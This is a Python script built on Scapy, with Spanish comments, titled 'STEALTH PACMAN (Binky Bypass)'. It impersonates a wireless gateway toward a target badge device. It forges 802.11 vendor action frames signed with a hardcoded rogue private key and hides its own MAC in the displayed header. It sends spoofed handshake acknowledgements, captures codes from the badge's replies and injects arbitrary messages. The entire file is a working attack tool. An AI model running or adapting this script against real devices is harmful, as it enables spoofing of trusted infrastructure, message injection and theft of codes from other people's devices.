import sys
import struct
import argparse
import select
import binascii
import re
from scapy.all import *
import nacl.signing
import nacl.encoding
import os
import time
import threading

# Professional Gateway Emulator V12.1 - STEALTH PACMAN (Binky Bypass)

# Colores para la consola
C_BLUE = "\033[94m"
C_CYAN = "\033[96m"
C_GREEN = "\033[92m"
C_RED = "\033[91m"
C_YELLOW = "\033[93m"
C_BOLD = "\033[1m"
C_RESET = "\033[0m"

ROGUE_PRIV_KEY_HEX = "69324e0495f4544cfcaeae314034c8acd22d3abab60404274f7273bf305bc724"
OUI = b"\x18\xfe\x34"
HDR_CONST = b"\x04\x02"
IDENTITY_MAC_STR = "08:08:08:08:08:08" 
MAC_BYTES = binascii.unhexlify(IDENTITY_MAC_STR.replace(':', ''))

def add_tlv(tag, value):
    if isinstance(value, bytes): v_bytes = value
    else: v_bytes = value.encode('utf-8')
    return struct.pack('BB', tag, len(v_bytes)) + v_bytes

def smart_wrap(text, width=14):
    words = text.split()
    lines = []
    current_line = []
    current_length = 0
    for word in words:
        if current_length + len(word) > width:
            lines.append(" ".join(current_line))
            current_line = [word]
            current_length = len(word)
        else:
            current_line.append(word)
            current_length += len(word) + 1
    if current_line: lines.append(" ".join(current_line))
    return "\n".join(lines)

def build_pkt(target_mac, nonce, seq_id, data_text, ptype=0x03):
    target_mac_bytes = binascii.unhexlify(target_mac.replace(':', ''))
    id_bytes = struct.pack('>I', seq_id)[1:]
    
    # --- STEALTH HEADER (FIX WloR) ---
    # La placa muestra los bytes del offset 5 al 11.
    # Usamos espacios (0x20) en lugar de la MAC real para que sea invisible.
    stealth_mac = b"      " 
    header = id_bytes + struct.pack('BB', ptype, 2) + stealth_mac + b"\x05"
    
    # Metemos la MAC real en un Tag (26) por si el protocolo lo valida internamente
    # y el texto en el Tag 25 (Mensaje).
    tlv_data = add_tlv(25, smart_wrap(data_text))
    data_32 = tlv_data.ljust(32, b'\x00')[:32]
    
    msg_to_sign = header + MAC_BYTES + data_32
    signer = nacl.signing.SigningKey(ROGUE_PRIV_KEY_HEX, encoder=nacl.encoding.HexEncoder)
    signature = signer.sign(msg_to_sign).signature
    
    payload = header + MAC_BYTES + data_32 + signature
    prefix = OUI + nonce + OUI + HDR_CONST
    return RadioTap()/Dot11(addr1=target_mac, addr2=IDENTITY_MAC_STR)/Dot11Action(category=127)/Raw(load=prefix+payload)

def build_ack_final(target_mac, nonce, q_id_bytes, ptype=0x05):
    target_mac_bytes = binascii.unhexlify(target_mac.replace(':', ''))
    
    # ACK PERFECTO: 5 campos para que lea todos los tags de handshake (15, 13...)
    header = q_id_bytes + struct.pack('BB', ptype, 5) + b"      " + b"\x05"
    
    # Payload completo que la firm busca en 0x353a3
    tlv_data = (add_tlv(26, target_mac_bytes) + 
                add_tlv(25, " ") +
                add_tlv(27, "HACKER") +
                add_tlv(15, q_id_bytes) + 
                add_tlv(13, b"\x01"))
    
    data_32 = tlv_data.ljust(32, b'\x00')[:32]
    msg_to_sign = header + MAC_BYTES + data_32
    signer = nacl.signing.SigningKey(ROGUE_PRIV_KEY_HEX, encoder=nacl.encoding.HexEncoder)
    signature = signer.sign(msg_to_sign).signature
    
    payload = header + MAC_BYTES + data_32 + signature
    prefix = OUI + nonce + OUI + HDR_CONST
    return RadioTap()/Dot11(addr1=target_mac, addr2=IDENTITY_MAC_STR)/Dot11Action(category=127)/Raw(load=prefix+payload)

def main():
    parser = argparse.ArgumentParser(description="Emulador Gateway V12.1 - Stealth")
    parser.add_argument("-i", "--interface", required=True, help="Monitor interface")
    parser.add_argument("-m", "--mac", required=True, help="Target badge MAC")
    args = parser.parse_args()

    conf.iface = args.interface
    target_mac = args.mac.lower()
    seq_id = 0x595506 
    last_nonce = None
    processed_responses = set()
    
    print(f"{C_BOLD}{C_BLUE}[*] Iniciando PACMAN V12.1 (Stealth Fix) para {target_mac}...{C_RESET}")

    def handshake_thread(target_mac, q_id_bytes):
        nonlocal last_nonce
        print(f"{C_YELLOW}[*] Validando Handshake para Q_ID {q_id_bytes.hex()}...{C_RESET}")
        for d in [0.2, 0.5, 0.8, 1.2, 1.8]:
            time.sleep(d)
            if not last_nonce: continue
            for _ in range(5): 
                ack = build_ack_final(target_mac, last_nonce, q_id_bytes)
                sendp(ack, iface=args.interface, verbose=False, count=2)

    def pkt_handler(pkt):
        nonlocal last_nonce, seq_id
        if pkt.haslayer(Dot11) and pkt.addr2 == target_mac:
            if pkt.haslayer(Raw):
                load = pkt.getlayer(Raw).load
                if load.startswith(OUI) and len(load) >= 9:
                    last_nonce = load[3:9]

                if len(load) >= 80: 
                    payload = load[14:]
                    p_type, p_id_bytes = payload[3], payload[0:3] 
                    
                    if p_type == 0x02 and p_id_bytes not in processed_responses:
                        processed_responses.add(p_id_bytes)
                        print(f"\n{C_BOLD}{C_RED}[!!!] RESPUESTA RECIBIDA (ID: {p_id_bytes.hex()}){C_RESET}")
                        
                        # Extracción agresiva
                        matches = re.findall(b'[A-Z0-9]{4,12}', payload)
                        for m in matches:
                            decoded = m.decode('utf-8', 'ignore')
                            if decoded not in ["080808080808", "000000", "BINKY"]:
                                print(f"      {C_BOLD}{C_GREEN}>>> CÓDIGO CAPTURADO: {decoded} <<<{C_RESET}")
                        
                        threading.Thread(target=handshake_thread, args=(target_mac, p_id_bytes), daemon=True).start()

    threading.Thread(target=lambda: sniff(iface=args.interface, prn=pkt_handler, store=0), daemon=True).start()

    while True:
        if not last_nonce:
            for ch in range(1, 14):
                os.system(f"sudo iwconfig {args.interface} channel {ch} >/dev/null 2>&1")
                time.sleep(0.3)
                if last_nonce: break
        
        if last_nonce:
            print(f"\r{C_CYAN}[ PACMAN ]{C_RESET} | Nonce: {last_nonce.hex()} | ID: {hex(seq_id)}   ", end="", flush=True)
            r, _, _ = select.select([sys.stdin], [], [], 0.5)
            if r:
                line = sys.stdin.readline().strip()
                if line:
                    pkt = build_pkt(target_mac, last_nonce, seq_id, line)
                    sendp(pkt, iface=args.interface, verbose=False, count=10)
                    print(f"\n{C_BLUE}[+] Mensaje enviado (Limpio)!{C_RESET}")
                    seq_id += 1

if __name__ == "__main__":
    main()